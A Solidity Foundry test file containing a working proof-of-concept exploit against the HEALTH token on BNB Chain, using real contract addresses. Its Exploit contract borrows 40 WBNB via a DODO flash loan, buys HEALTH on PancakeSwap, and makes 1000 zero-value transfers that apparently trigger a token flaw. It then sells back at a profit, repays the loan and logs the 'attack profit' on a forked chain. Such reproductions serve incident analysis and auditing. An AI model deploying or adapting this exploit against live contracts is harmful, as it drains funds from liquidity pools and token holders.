pragma solidity ^0.8.10;
import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/IPancakeRouter02.sol";
interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}

contract Exploit {
    address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public HEALTH = 0x32B166e082993Af6598a89397E82e123ca44e74E;
    address public flashLoanPool = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    IPancakeRouter02 Router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function Start() public {
        IDODO(flashLoanPool).flashLoan(40e18, 0, address(this), bytes("Loan"));
    }
    
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IERC20(WBNB).approve(address(Router), type(uint256).max);
        IERC20(HEALTH).approve(address(Router), type(uint256).max);

        address[] memory buyPath = new address[](2);
        buyPath[0] = WBNB;
        buyPath[1] = HEALTH;

        address[] memory sellPath = new address[](2);
        sellPath[0] = HEALTH;
        sellPath[1] = WBNB;
        
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            40e18,
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        for(uint i = 0; i < 1000; i++){
            IERC20(HEALTH).transfer(msg.sender, 0);
        }
        
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(HEALTH).balanceOf(address(this)),
            0,
            sellPath,
            address(this),
            block.timestamp
        );
        
        IERC20(WBNB).transfer(flashLoanPool, 40e18);
    }

    fallback() external payable{}     
}

contract test is DSTest{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 22337425);
    }

    function testExploit() public {
        exploit = new Exploit();
        exploit.Start();
        verify();
    }
    function verify() public {
        console.log("============== Attack profit: ~", IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(exploit)) / 1e18 ,"WBNB", "==============");
    }
}